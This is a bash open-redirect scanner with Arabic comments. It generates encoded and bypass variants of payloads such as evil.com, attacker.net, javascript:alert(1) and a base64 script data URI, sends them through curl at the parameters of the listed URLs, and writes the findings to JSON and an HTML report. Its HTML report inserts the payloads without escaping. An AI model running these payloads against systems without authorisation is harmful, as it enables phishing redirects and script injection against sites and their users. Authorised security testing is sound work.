#!/bin/bash

# ============== إعدادات عامة ==============
VERSION="3.0"
AUTHOR="Security Team"
SCAN_DATE=$(date +"%Y-%m-%d %H:%M:%S")

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# قائمة الباراميترات المشبوهة
suspicious_params=(
    "redirect"
    "redirect_url"
    "redir"
    "url"
    "next"
    "return"
    "rtn"
    "continue"
    "link"
    "target"
    "destination"
    "goto"
    "forward"
    "forwarding"
    "urlredirect"
    "redirectto"
    "returnto"
    "return_to"
    "callback"
    "return_url"
    "returnurl"
    "rurl"
    "redirect_uri"
    "redirecturi"
    "redirect_uri"
    "redirect_url"
    "redirecturl"
    "redirectto"
    "redir_url"
    "redirurl"
    "next_page"
    "nextpage"
    "page"
    "view"
    "file"
    "file_name"
    "filename"
    "path"
    "folder"
    "dir"
    "display"
    "show"
    "load"
    "location"
    "to"
    "out"
    "view"
    "image_url"
    "img_url"
    "urlredirect"
    "redirect_url"
    "redirectto"
    "redirect_uri"
    "redirecturi"
    "redirect_url"
    "redirecturl"
    "redirectto"
    "redir_url"
    "redirurl"
    "next_page"
    "nextpage"
    "page"
    "view"
    "file"
    "file_name"
    "filename"
    "path"
    "folder"
    "dir"
    "display"
    "show"
    "load"
    "location"
    "to"
    "out"
    "view"
    "image_url"
    "img_url"
)

# Enhanced payload list with more variations
base_payloads=(
    "https://evil.com/"
    "http://evil.com/"
    "//evil.com/"
    "/\\evil.com"
    "https://google.com/"
    "http://127.0.0.1/"
    "http://localhost/"
    "https://attacker.net/"
    "https://example.com/"
    "http://example.com/"
    "javascript:alert(1)"
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    "//evil.com\\@example.com"
    "http://127.0.0.1:8080/"
    "http://0.0.0.0/"
)

# Domains to check for in redirects (indicating successful exploitation)
suspicious_domains=(
    "evil.com"
    "attacker.net"
    "google.com"
    "example.com"
    "127.0.0.1"
    "localhost"
    "0.0.0.0"
)

# ============== دوال مساعدة ==============
# دالة للهروب من الأحرف الخاصة في JSON
escape_json() {
    local string="$1"
    echo "$string" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\//\\\//g' -e 's/\$/\\$/g' -e "s/'/\\'/g" -e 's/\@/\\@/g'
}

# استخراج النطاق من URL
extract_domain() {
    echo "$1" | awk -F/ '{print $3}' | awk -F: '{print $1}'
}

# التحقق من إعادة التوجيه الخارجية
is_external_redirect() {
    local target_domain=$(extract_domain "$1")
    local location_domain=$(extract_domain "$2")
    
    # إذا كان النطاق فارغًا أو هو نفسه، ليس إعادة توجيه خارجية
    [[ -z "$location_domain" ]] && return 1
    [[ "$target_domain" == "$location_domain" ]] && return 1
    
    # تحقق من القائمة السوداء للنطاقات
    for domain in "${suspicious_domains[@]}"; do
        if [[ "$location_domain" == *"$domain"* ]]; then
            return 0
        fi
    done
    
    return 1
}

# تحديد مستوى خطورة الثغرة
determine_severity() {
    local payload="$1"
    local location="$2"
    
    # High: إعادة توجيه إلى نطاق خارجي معروف
    if echo "$payload" | grep -q -E "(evil\.com|attacker\.net)" || 
       echo "$location" | grep -q -E "(evil\.com|attacker\.net)"; then
        echo "High"
    # Medium: إعادة توجيه إلى localhost أو عناوين IP خاصة
    elif echo "$payload" | grep -q -E "(127\.0\.0\.1|localhost|0\.0\.0\.0)" ||
         echo "$location" | grep -q -E "(127\.0\.0\.1|localhost|0\.0\.0\.0)"; then
        echo "Medium"
    # Low: إعادة توجيه إلى نطاقات أخرى
    else
        echo "Low"
    fi
}

# ============== Function to generate payload variations ==============
generate_payloads() {
    local p="$1"
    echo "$p"
    # URL encoding
    python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))" 2>/dev/null
    python3 -c "import urllib.parse; print(urllib.parse.quote_plus('$p'))" 2>/dev/null
    # Double encoding
    python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('$p')))" 2>/dev/null
    # HTML encoding
    echo "$p" | sed 's/\(.\)/&#\1;/g'
    # Null byte tricks
    echo "${p}%00"
    echo "%00${p}"
    echo "${p}%2500"
    # Slash bypass
    echo "/${p}"
    echo "${p}/..\\"
    echo "${p}@example.com"
    # Protocol relative
    echo "//${p#*//}"
    # Mixed case
    echo "${p^^}"  # Uppercase
    echo "${p,,}"  # Lowercase
    # Base64 encoding
    echo "$(python3 -c "import base64; print(base64.urlsafe_b64encode(b'$p').decode())" 2>/dev/null)"
    # UTF-8 encoding
    echo "$(python3 -c "print('$p'.encode('utf-8').hex())" 2>/dev/null)"
}

# ============== استخراج الباراميترات من الروابط ==============
extract_parameters() {
    local input_file="$1"
    local output_file="$2"
    
    echo "Extracting parameters from URLs..."
    
    # استخراج جميع الباراميترات من الروابط
    grep -oP '(?<=\?|&)[^=]+(?==)' "$input_file" | sort -u > "$output_file"
    
    # تصفية الباراميترات المشبوهة فقط
    local filtered_file="${output_file}.filtered"
    > "$filtered_file"
    
    while IFS= read -r param; do
        for suspicious_param in "${suspicious_params[@]}"; do
            if [[ "$param" == *"$suspicious_param"* ]]; then
                echo "$param" >> "$filtered_file"
                break
            fi
        done
    done < "$output_file"
    
    # إذا لم نجد باراميترات مشبوهة، نستخدم جميع الباراميترات
    if [[ ! -s "$filtered_file" ]]; then
        cp "$output_file" "$filtered_file"
    fi
    
    echo "$filtered_file"
}

# ============== Initialize payloads array ==============
payloads=()
for b in "${base_payloads[@]}"; do
    while IFS= read -r gen; do
        # Skip empty lines and add to payloads
        if [[ -n "$gen" ]]; then
            payloads+=("$gen")
        fi
    done < <(generate_payloads "$b")
done

# Remove duplicates
IFS=$'\n' unique_payloads=($(sort -u <<<"${payloads[*]}"))
unset IFS
payloads=("${unique_payloads[@]}")

# ============== Files setup ==============
results_json="results.json"
results_html="index.html"
log_file="scan.log"
params_file="parameters.txt"

# Initialize files
echo "[]" > "$results_json"
echo -e "Open Redirect Scan Log\nDate: $SCAN_DATE\nVersion: $VERSION\n" > "$log_file"

# ============== Logging function ==============
log() {
    local message="$1"
    local level="${2:-INFO}"
    local color="$NC"
    
    case "$level" in
        "SUCCESS") color="$GREEN" ;;
        "ERROR") color="$RED" ;;
        "WARNING") color="$YELLOW" ;;
        "INFO") color="$BLUE" ;;
    esac
    
    echo -e "${color}[$level]${NC} $message" | tee -a "$log_file"
}

# ============== Check URL function ==============
check_url() {
    local target="$1"
    local param="$2"
    local payload="$3"
    local url=""

    log "Testing $param with payload: $payload" "INFO"
    
    if [[ "$target" == *"="* ]]; then
        base="${target%%\?*}"
        qs="${target#*\?}"
        new_qs=""
        IFS='&' read -ra parts <<< "$qs"
        for kv in "${parts[@]}"; do
            key="${kv%%=*}"
            if [[ "$key" == "$param" ]]; then
                new_qs+="&${key}=${payload}"
            else
                new_qs+="&${kv}"
            fi
        done
        url="${base}?${new_qs:1}"
    else
        url="${target}?${param}=${payload}"
    fi

    # Make the request and capture response details
    local response
    response=$(curl -s -o /dev/null -w "%{http_code} %{time_total} %{size_download} %{url_effective}\n" -I -L --connect-timeout 10 --max-time 20 "$url" 2>/dev/null)
    
    if [[ $? -ne 0 ]]; then
        log "Failed to connect to $url" "ERROR"
        return 1
    fi
    
    local status=$(echo "$response" | awk '{print $1}')
    local time_taken=$(echo "$response" | awk '{print $2}')
    local size=$(echo "$response" | awk '{print $3}')
    local final_url=$(echo "$response" | awk '{print $4}')
    
    # Get location header if exists
    local location
    location=$(curl -s -I -L --connect-timeout 10 "$url" | grep -i "^location:" | tail -n 1 | awk '{$1=""; print $0}' | sed 's/^[ \t]*//' | tr -d '\r')
    
    # Check if we found a potential redirect
    local found=0
    if [[ -n "$location" ]] || [[ "$status" =~ 3[0-9][0-9] ]]; then
        found=1
    fi

    if [[ $found -eq 1 ]]; then
        # تحديد خطورة الثغرة
        severity=$(determine_severity "$payload" "$location")
        confirmed=$(is_external_redirect "$target" "$location" && echo "true" || echo "false")
        
        log "Potential open redirect found ($severity): $url → $location" "SUCCESS"
        
        # Add to JSON results with proper escaping
        local tmp=$(mktemp)
        obj=$(jq -n \
            --arg target "$(escape_json "$target")" \
            --arg param "$(escape_json "$param")" \
            --arg payload "$(escape_json "$payload")" \
            --arg location "$(escape_json "$location")" \
            --arg status "$status" \
            --arg time_taken "$time_taken" \
            --arg size "$size" \
            --arg final_url "$(escape_json "$final_url")" \
            --arg scan_date "$SCAN_DATE" \
            --arg severity "$severity" \
            --argjson confirmed $confirmed \
            '{target: $target, parameter: $param, payload: $payload, final_location: $location, status: $status, time_taken: $time_taken, size: $size, final_url: $final_url, scan_date: $scan_date, severity: $severity, confirmed: $confirmed}')
        
        jq ". += [$obj]" "$results_json" > "$tmp" && mv "$tmp" "$results_json"
    fi
}

# ============== Main execution ==============
print_banner() {
    echo -e "${BLUE}"
    echo "=================================================="
    echo "           Open Redirect Scanner v$VERSION"
    echo "=================================================="
    echo -e "${NC}"
}

usage() {
    echo "Usage: $0 [options] urls.txt"
    echo "Options:"
    echo "  -t, --threads NUM    Number of concurrent threads (default: 10)"
    echo "  -o, --output DIR     Output directory (default: current directory)"
    echo "  -a, --all-params     Test all parameters (not just suspicious ones)"
    echo "  -h, --help           Show this help message"
    exit 1
}

# Parse command line arguments
THREADS=10
OUTPUT_DIR="."
ALL_PARAMS=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--threads)
            THREADS="$2"
            shift
            shift
            ;;
        -o|--output)
            OUTPUT_DIR="$2"
            shift
            shift
            ;;
        -a|--all-params)
            ALL_PARAMS=true
            shift
            ;;
        -h|--help)
            usage
            ;;
        *)
            URLS_FILE="$1"
            shift
            ;;
    esac
done

if [[ -z "$URLS_FILE" ]]; then
    usage
fi

if [[ ! -f "$URLS_FILE" ]]; then
    log "URLs file not found: $URLS_FILE" "ERROR"
    exit 1
fi

# Create output directory if it doesn't exist
mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR" || exit 1

print_banner
log "Starting scan with $THREADS threads" "INFO"
log "Loaded ${#payloads[@]} unique payloads" "INFO"

# استخراج الباراميترات من الروابط
if [[ "$ALL_PARAMS" = true ]]; then
    # استخراج جميع الباراميترات بدون تصفية
    grep -oP '(?<=\?|&)[^=]+(?==)' "$URLS_FILE" | sort -u > "$params_file"
else
    # استخراج الباراميترات المشبوهة فقط
    extract_parameters "$URLS_FILE" "$params_file"
fi

# Count targets and parameters
URL_COUNT=$(grep -cve '^\s*$' "$URLS_FILE")
PARAM_COUNT=$(grep -cve '^\s*$' "$params_file")

log "Found $URL_COUNT URLs to test" "INFO"
log "Found $PARAM_COUNT parameters to test" "INFO"

# Process URLs
current_url=0
while read -r url; do
    [[ -z "$url" ]] && continue
    ((current_url++))
    
    log "Processing URL $current_url of $URL_COUNT: $url" "INFO"
    
    # Get parameters for this specific URL
    if [[ "$url" == *"="* ]]; then
        # استخراج الباراميترات من URL الحالي
        url_params=$(echo "$url" | grep -oP '(?<=\?|&)[^=]+(?==)')
        
        if [[ "$ALL_PARAMS" = false ]]; then
            # تصفية الباراميترات المشبوهة فقط
            filtered_params=""
            for url_param in $url_params; do
                for suspicious_param in "${suspicious_params[@]}"; do
                    if [[ "$url_param" == *"$suspicious_param"* ]]; then
                        filtered_params+="$url_param "
                        break
                    fi
                done
            done
            
            # إذا لم نجد باراميترات مشبوهة، نستخدم جميع باراميترات الرابط
            if [[ -z "$filtered_params" ]]; then
                url_params=$(echo "$url_params" | tr '\n' ' ')
            else
                url_params="$filtered_params"
            fi
        else
            url_params=$(echo "$url_params" | tr '\n' ' ')
        fi
    else
        # إذا لم يكن هناك باراميترات في الرابط، نستخدم القائمة الافتراضية
        if [[ "$ALL_PARAMS" = true ]]; then
            url_params=$(cat "$params_file" | tr '\n' ' ')
        else
            url_params="redirect redirect_url redir url next return rtn continue link"
        fi
    fi
    
    for param in $url_params; do
        log "Testing parameter: $param" "INFO"
        for payload in "${payloads[@]}"; do
            # Limit concurrent threads
            while [[ $(jobs -r | wc -l) -ge $THREADS ]]; do
                sleep 0.5
            done
            
            check_url "$url" "$param" "$payload" &
        done
    done
done < "$URLS_FILE"

# Wait for all background processes
wait

# ============== Generate HTML report ==============
log "Generating HTML report..." "INFO"

# Count vulnerabilities by severity
high_count=$(jq 'map(select(.severity == "High")) | length' "$results_json")
medium_count=$(jq 'map(select(.severity == "Medium")) | length' "$results_json")
low_count=$(jq 'map(select(.severity == "Low")) | length' "$results_json")
confirmed_count=$(jq 'map(select(.confirmed == true)) | length' "$results_json")

cat > "$results_html" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Redirect Scan Report</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f8f9fa;
            color: #333;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #2c3e50;
            border-bottom: 2px solid #ecf0f1;
            padding-bottom: 10px;
        }
        .summary {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .severity-high { color: #e74c3c; font-weight: bold; }
        .severity-medium { color: #e67e22; font-weight: bold; }
        .severity-low { color: #27ae60; font-weight: bold; }
        .filters {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .filters input, .filters select {
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #2c3e50;
            color: white;
            position: sticky;
            top: 0;
        }
        tr:hover {
            background-color: #f5f5f5;
        }
        .status-3xx {
            color: #e67e22;
            font-weight: bold;
        }
        .status-200 {
            color: #27ae60;
            font-weight: bold;
        }
        .status-4xx, .status-5xx {
            color: #e74c3c;
            font-weight: bold;
        }
        .payload {
            max-width: 300px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .details-row {
            display: none;
        }
        .details-row.active {
            display: table-row;
        }
        .toggle-details {
            cursor: pointer;
            color: #3498db;
        }
        .export-btn {
            background: #2c3e50;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 15px;
        }
        .export-btn:hover {
            background: #1a252f;
        }
        @media (max-width: 768px) {
            .filters {
                flex-direction: column;
            }
            table {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Open Redirect Vulnerability Report</h1>
        
        <div class="summary">
            <p><strong>Scan Date:</strong> <span id="scan-date">$SCAN_DATE</span></p>
            <p><strong>URLs Processed:</strong> <span id="url-count">$URL_COUNT</span></p>
            <p><strong>Parameters Tested:</strong> <span id="param-count">$PARAM_COUNT</span></p>
            <p><strong>Payloads Used:</strong> <span id="payload-count">${#payloads[@]}</span></p>
            <p><strong>Vulnerabilities Found:</strong> <span id="vuln-count">0</span></p>
            <p><strong>High Severity:</strong> <span class="severity-high">$high_count</span></p>
            <p><strong>Medium Severity:</strong> <span class="severity-medium">$medium_count</span></p>
            <p><strong>Low Severity:</strong> <span class="severity-low">$low_count</span></p>
            <p><strong>Confirmed External Redirects:</strong> <span>$confirmed_count</span></p>
        </div>

        <button class="export-btn" onclick="exportCSV()">Export to CSV</button>
        
        <div class="filters">
            <input type="text" id="search" placeholder="Search..." oninput="filterTable()">
            <select id="status-filter" onchange="filterTable()">
                <option value="">All Statuses</option>
                <option value="3">3xx Redirects</option>
                <option value="2">200 OK</option>
                <option value="4">4xx Errors</option>
                <option value="5">5xx Errors</option>
            </select>
            <select id="severity-filter" onchange="filterTable()">
                <option value="">All Severities</option>
                <option value="High">High</option>
                <option value="Medium">Medium</option>
                <option value="Low">Low</option>
            </select>
            <select id="parameter-filter" onchange="filterTable()">
                <option value="">All Parameters</option>
            </select>
        </div>
        
        <table id="results-table">
            <thead>
                <tr>
                    <th>Target URL</th>
                    <th>Parameter</th>
                    <th>Payload</th>
                    <th>Status</th>
                    <th>Redirect Location</th>
                    <th>Severity</th>
                    <th>Confirmed</th>
                    <th>Time</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="results-body">
                <!-- Results will be populated by JavaScript -->
            </tbody>
        </table>
    </div>

    <script>
        let allData = [];
        
        // Fetch results from JSON
        fetch('$results_json')
            .then(response => response.json())
            .then(data => {
                allData = data;
                document.getElementById('vuln-count').textContent = data.length;
                populateTable(data);
                updateParameterFilter(data);
            })
            .catch(error => console.error('Error loading results:', error));

        function populateTable(data) {
            const tbody = document.getElementById('results-body');
            tbody.innerHTML = '';
            
            data.forEach((row, index) => {
                const tr = document.createElement('tr');
                
                // Status class
                const statusClass = `status-${row.status.charAt(0)}xx`;
                const severityClass = `severity-${row.severity.toLowerCase()}`;
                
                tr.innerHTML = \`
                    <td>\${row.target}</td>
                    <td>\${row.parameter}</td>
                    <td class="payload" title="\${row.payload}">\${row.payload}</td>
                    <td class="\${statusClass}">\${row.status}</td>
                    <td>\${row.final_location || 'N/A'}</td>
                    <td class="\${severityClass}">\${row.severity}</td>
                    <td>\${row.confirmed ? 'Yes' : 'No'}</td>
                    <td>\${row.time_taken}s</td>
                    <td>
                        <span class="toggle-details" onclick="toggleDetails(\${index})">Show Details</span> | 
                        <a href="\${row.final_url}" target="_blank">Test</a>
                    </td>
                \`;
                
                tbody.appendChild(tr);
                
                // Add details row
                const detailsRow = document.createElement('tr');
                detailsRow.className = 'details-row';
                detailsRow.id = \`details-\${index}\`;
                detailsRow.innerHTML = \`
                    <td colspan="9">
                        <strong>Full URL:</strong> \${row.final_url}<br>
                        <strong>Payload:</strong> \${row.payload}<br>
                        <strong>Response Size:</strong> \${row.size} bytes<br>
                        <strong>Scan Date:</strong> \${row.scan_date}
                    </td>
                \`;
                
                tbody.appendChild(detailsRow);
            });
        }
        
        function toggleDetails(index) {
            const detailsRow = document.getElementById(\`details-\${index}\`);
            detailsRow.classList.toggle('active');
            
            const toggleBtn = document.querySelector(\`#results-body tr:nth-child(\${index*2+1}) .toggle-details\`);
            toggleBtn.textContent = toggleBtn.textContent === 'Show Details' ? 'Hide Details' : 'Show Details';
        }
        
        function updateParameterFilter(data) {
            const paramFilter = document.getElementById('parameter-filter');
            const params = [...new Set(data.map(item => item.parameter))];
            
            params.forEach(param => {
                const option = document.createElement('option');
                option.value = param;
                option.textContent = param;
                paramFilter.appendChild(option);
            });
        }
        
        function filterTable() {
            const searchText = document.getElementById('search').value.toLowerCase();
            const statusFilter = document.getElementById('status-filter').value;
            const severityFilter = document.getElementById('severity-filter').value;
            const paramFilter = document.getElementById('parameter-filter').value;
            
            const filteredData = allData.filter(item => {
                const matchesSearch = item.target.toLowerCase().includes(searchText) || 
                                    item.payload.toLowerCase().includes(searchText) ||
                                    (item.final_location && item.final_location.toLowerCase().includes(searchText));
                
                const matchesStatus = !statusFilter || item.status.startsWith(statusFilter);
                const matchesSeverity = !severityFilter || item.severity === severityFilter;
                const matchesParam = !paramFilter || item.parameter === paramFilter;
                
                return matchesSearch && matchesStatus && matchesSeverity && matchesParam;
            });
            
            populateTable(filteredData);
        }
        
        function exportCSV() {
            const headers = ['Target', 'Parameter', 'Payload', 'Status', 'Final Location', 'Severity', 'Confirmed', 'Time Taken', 'Size', 'Final URL', 'Scan Date'];
            const csvData = allData.map(row => [
                row.target,
                row.parameter,
                \`"\${row.payload}"\`,
                row.status,
                row.final_location,
                row.severity,
                row.confirmed ? 'Yes' : 'No',
                row.time_taken,
                row.size,
                row.final_url,
                row.scan_date
            ]);
            
            const csvContent = [headers, ...csvData]
                .map(row => row.join(','))
                .join('\\n');
            
            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
            const link = document.createElement('a');
            const url = URL.createObjectURL(blob);
            
            link.setAttribute('href', url);
            link.setAttribute('download', 'open_redirect_results.csv');
            link.style.visibility = 'hidden';
            
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    </script>
</body>
</html>
EOF

log "Scan completed. Results saved to $results_json and $results_html" "SUCCESS"
log "View the report by opening $results_html in your browser" "INFO" 